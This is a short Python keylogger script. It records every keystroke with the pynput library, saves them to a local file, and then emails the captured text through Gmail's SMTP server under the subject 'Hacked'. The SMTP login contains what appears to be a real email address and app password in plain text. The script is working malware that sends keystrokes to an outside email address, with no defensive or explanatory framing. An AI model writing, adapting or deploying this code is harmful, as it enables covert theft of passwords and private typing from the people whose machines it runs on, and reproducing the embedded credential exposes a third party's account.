import smtplib, ssl
from pynput import keyboard


def on_press(key):
	try:
		txt = '{}'.format(key.char)
		f.write(txt)
	except AttributeError:
		if key == keyboard.Key.space:
			f.write(' ')
		else:
			txt = '[{}]'.format(key)
			f.write(txt)
	
def on_release(key):
	if key == keyboard.Key.esc:
		#Stop listener
		return False
    


context = ssl.create_default_context()

with smtplib.SMTP_SSL("smtp.gmail.com", 465, context = context) as server:
	server.login("akos.marton.janos@mag.ro", "agmwpioxztkqhdry")
	print("lol")
	message = """\
	Subject: Hacked

	"""
	f = open("xd.txt", "w")
	
	with keyboard.Listener(on_press = on_press, 
	on_release = on_release) as listener:
		listener.join()
	
	f.close()
	f = open("xd.txt", "r")
	lines = f.readlines()
	for line in lines:
		message += line 

	
	f.close()
	
	server.sendmail("akos.marton.janos@mag.ro", "janosakosmarton@gmail.com", message)
	
